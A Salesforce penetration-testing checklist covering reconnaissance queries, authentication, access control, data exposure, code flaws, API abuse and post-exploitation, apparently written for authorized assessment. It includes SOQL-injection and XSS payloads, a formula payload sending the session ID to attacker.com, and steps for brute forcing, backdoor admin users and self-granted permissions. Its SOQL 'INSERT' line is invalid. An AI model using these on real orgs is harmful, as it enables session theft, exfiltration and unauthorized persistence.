
---
## Table of Contents

1. [Preparation & Legal Considerations](#preparation--legal-considerations)
2. [Reconnaissance & Information Gathering](#reconnaissance--information-gathering)
3. [Authentication & Session Management](#authentication--session-management)
4. [Authorization & Access Control Assessment](#authorization--access-control-assessment)
5. [Data Leak & Sensitive Info Exposure](#data-leak--sensitive-info-exposure)
6. [Custom Code Security Testing](#custom-code-security-testing)
7. [Platform Configuration & Metadata Security](#platform-configuration--metadata-security)
8. [API & Integration Security](#api--integration-security)
9. [Client-Side & UX Vulnerabilities](#client-side--ux-vulnerabilities)
10. [Advanced & Chainable Attack Vectors](#advanced--chainable-attack-vectors)
11. [Persistence, Lateral Movement & Post-Exploitation](#persistence-lateral-movement--post-exploitation)
12. [Reporting, Remediation & References](#reporting-remediation--references)

---

## 1. Preparation

**Checklist**
- **Test Accounts** for:  
  - Admin, Standard User, Guest, Integration
- **Tooling**:  
  - Salesforce CLI (sfdx), simple_salesforce, Postman, Burp Suite, Salesforce Inspector, PMD, browser dev tools

---
## 2. Reconnaissance & Information Gathering

### Salesforce Edition & Instance
_Identify org context, features, and technical footprint_

**UI Navigation**
- _Setup > Company Information_ for Org ID, Edition, Instance

**SOQL**
```soql
SELECT OrganizationType, Edition, InstanceName FROM Organization
```

### User & Profile Enumeration
_Find high-value/admin accounts and role mappings._

**SOQL**
```soql
SELECT Id, Username, Email, Profile.Name, UserRole.Name, IsActive FROM User
ORDER BY Profile.Name
```

_Find users with sensitive permissions:_
```soql
SELECT Assignee.Name, PermissionSet.PermissionsModifyAllData
FROM PermissionSetAssignment
WHERE PermissionSet.PermissionsModifyAllData = TRUE OR PermissionSet.PermissionsViewAllData = TRUE
```

### Public Endpoints & Sites
_Identify unauthenticated exposure (Sites/Communities)._

- _Setup > Digital Experiences > All Sites_: Review for exposed URLs and guest content
- Manual: Visit home page while unauthenticated, try API endpoints (`/services/data/`)

### Custom Code & App Footprint
_Enumerate all custom code and package attack surface._

- _Setup > Custom Code_ (Apex Classes/Triggers, Visualforce, LWC/Aura)
- _Setup > Installed Packages_
- **SOQL**
```soql
SELECT Name, NamespacePrefix, ApiVersion FROM ApexClass
WHERE NamespacePrefix = null AND ApiVersion < 45.0
```

---

## 3. Authentication & Session Management

### Password Policy & Lockout
_Weak policies = brute force risk._

- _Setup > Security > Password Policies_
- **SOQL**
```soql
SELECT MinimumPasswordLength, PasswordComplexity, LockoutInterval FROM Organization
```
- **Testing**
  - **Hydra/Burp**: Try brute force with discovered/minimal password policy

### Multi-Factor Authentication (MFA)
_Check for enforcement._

**SOQL**
```soql
SELECT Id, Username, UserPreferencesMfaRequired FROM User WHERE IsActive = TRUE
```

- _Setup > Security > MFA_: Review enforcement policy

### Session Security
_Check for session fixation/hijacking._

- _Setup > Security > Session Settings_ (IP lock, timeout, domain lock)
- **Testing**
  - Replay session cookies from new IP/device
  - Attempt session fixation via re-used session IDs

### Login Flows & SSO
**SOQL**
```soql
SELECT Id, DeveloperName, UsedForAuthentication FROM Flow WHERE Type = 'LoginFlow'
SELECT Id, Name, Issuer, EntityId FROM SamlSsoConfig
```
- Review for logic weaknesses, MFA/SAML bypasses

---

## 4. Authorization & Access Control Assessment

### Profile & Permission Set Analysis
_Locate over-privileged users, map escalation paths._

**SOQL: Find high-privilege/profiles permission sets**
```soql
SELECT Name, PermissionsModifyAllData, PermissionsViewAllData FROM Profile
```
```soql
SELECT AssigneeId, PermissionSet.Name, PermissionSet.PermissionsModifyAllData
FROM PermissionSetAssignment WHERE PermissionSet.PermissionsModifyAllData = TRUE
```

### Field-Level Security (FLS)
_Check for control bypass/exposed fields._

**SOQL**
```soql
SELECT Id, ParentId, Field, PermissionsRead, PermissionsEdit
FROM FieldPermissions WHERE Field LIKE '%SSN%' OR Field LIKE '%Credit%'
```
_Test as low-priv user by querying sensitive fields (expect no access)._

### Sharing Model & Record Access
_Find over-permissive OWD & sharing rules._

- _Setup > Security > Sharing Settings_

**SOQL**
```soql
SELECT SObjectType, DefaultExternal, DefaultInternal FROM OrganizationWideDefault
```
- Test with practical IDOR: Change record ID in URL as a low-privileged user.

### Guest User & Community Exposure

**SOQL**
```soql
SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Guest%'
```
- _Sites > Public Access Settings_: Review CRUD permissions for guest profile.

---

## 5. Data Leak & Sensitive Info Exposure

### Sensitive Data Discovery

**SOQL**
```soql
SELECT Id, Name, SSN__c FROM Contact WHERE SSN__c != NULL
```
- Scan for custom objects/fields with possible PII/HCI.

### Data Export Capabilities

**Where to look**:
- _Setup > Data Export_; _Data Loader/Workbench_
- Bulk data extraction using API tokens

### Report/Dashboard Overexposure

**SOQL**
```soql
SELECT Id, Name, FolderName FROM Report WHERE FolderName = 'Public Reports'
```
- _Reports > All Reports_: Export as low-priv user

### Chatter, Feeds & Public Info

**SOQL**
```soql
SELECT Body, CreatedBy.Name FROM FeedItem WHERE Body LIKE '%password%' OR Body LIKE '%secret%'
```

---

## 6. Custom Code Security Testing

### SOQL Injection in Apex

**Vulnerability**
- Dynamic SOQL using untrusted input

**Example Payload**
```apex
String userInput = "' OR Name != '' OR '";
String query = 'SELECT Id, Name FROM Account WHERE Name = \'' + userInput + '\'';
List<Account> results = Database.query(query);
```

- **Test:** Submit payloads through any field/endpoint that feeds into SOQL

**Remediation**: Always use bind variables (`WHERE Name = :userInput`)

### FLS & CRUD Bypasses

**Vulnerability**
- Code ignores object/field-level security.

**Testing**
- As low-priv user, attempt to trigger DML or read objects/fields not granted via FLS.

**Remediation**
- Always call `isAccessible()`, `isUpdatable()`, utilize `WITH SECURITY_ENFORCED` in SOQL

### XSS in Visualforce/Lightning

**Vulnerability**
- Outputting unescaped user data.

**Code Example**
```html
<apex:outputText value="{!userInput}" escape="false"/>
```
- Inject payload: `<script>alert(42)</script>`

**Remediation**
- Always use `escape="true"`, use sanitized variables

### Aura/LWC Exposures

- @AuraEnabled methods called by unintended users.
- DOM-based XSS via unsafe innerHTML

**Remediation**: Set Apex Class security, avoid unsanitized DOM writes.

---

## 7. Platform Configuration & Metadata Security

### Critical Settings Audit

**IP Whitelisting/Restrictions**
```soql
SELECT Id, IpAddress, IpAddressMask FROM IpRestriction
```
- _Setup > Security > Network Access_

### Custom Settings & Custom Metadata

- _Setup > Custom Settings / Custom Metadata_
- Look for hardcoded secrets, API keys, or URLs

### Metadata API Abuse

- Unauthorized modification of profiles/validation rules via API (SOAP/REST)
- Test with `/services/Soap/m/XX.0` and manipulate metadata

---

## 8. API & Integration Security

### Connected Apps & OAuth

**SOQL**
```soql
SELECT Name, CallbackUrl, ConsumerKey FROM ConnectedApplication
```

**Test**
- Manipulate OAuth `redirect_uri`, overbroad scopes (`full`, `api`)
- Use unauthorized/abused OAuth tokens for data exfiltration

### Named Credentials

- Examine endpoint security (must be HTTPS)
- Test for SSRF, credential leak via misconfigured objects.

### REST/SOAP/Bulk API

- Test for excessive permissions via API tokens
- Abuse `/services/data/vXX.0/{sobjects/query/apexrest}` endpoints

**API Abuse Example**
```bash
curl -H "Authorization: Bearer <TOKEN>" \
     "https://<instance>.salesforce.com/services/data/v58.0/sobjects/Contact"
```

---

## 9. Client-Side & UX Vulnerabilities

### XSS & DOM-Based Attacks

- Insert payloads into custom inputs/components or formula fields
- Look for `retURL`/`startURL` open redirect in auth flows

### Clickjacking/CSRF

- _Setup > Session Settings_: Confirm clickjack protection is ON
- Try embedding Salesforce pages in iframes

---

## 10. Advanced & Chainable Attack Vectors

### Formula Injection

**Payloads**
```js
HYPERLINK("javascript:alert('Formula XSS')", "Click")
HYPERLINK("http://attacker.com/?sid="&$Api.Session_ID, "Export SID")
```
- Query all formula fields with potentially dangerous logic

### Platform Event/Process Builder/Flow Exploitation

- Low-priv user triggers system-context automation, e.g., process updates records they can't normally write

### Denial of Service

- Infinite Flows/recursive Apex/scheduled job loop

---

## 11. Persistence, Lateral Movement & Post-Exploitation

### Persistence

- Create hidden admin or backdoor user via Apex (if possible)
- Implant malicious Flow or scheduled Apex job for recurring access
- Register own Connected App for persistent OAuth access

### Lateral Movement

- Assign oneself admin permissionSet via vulnerable Flows/Process automation

**SOQL**
```soql
INSERT PermissionSetAssignment (PermissionSetId, AssigneeId) VALUES ('0PSxxx', '005xxx')
```

---
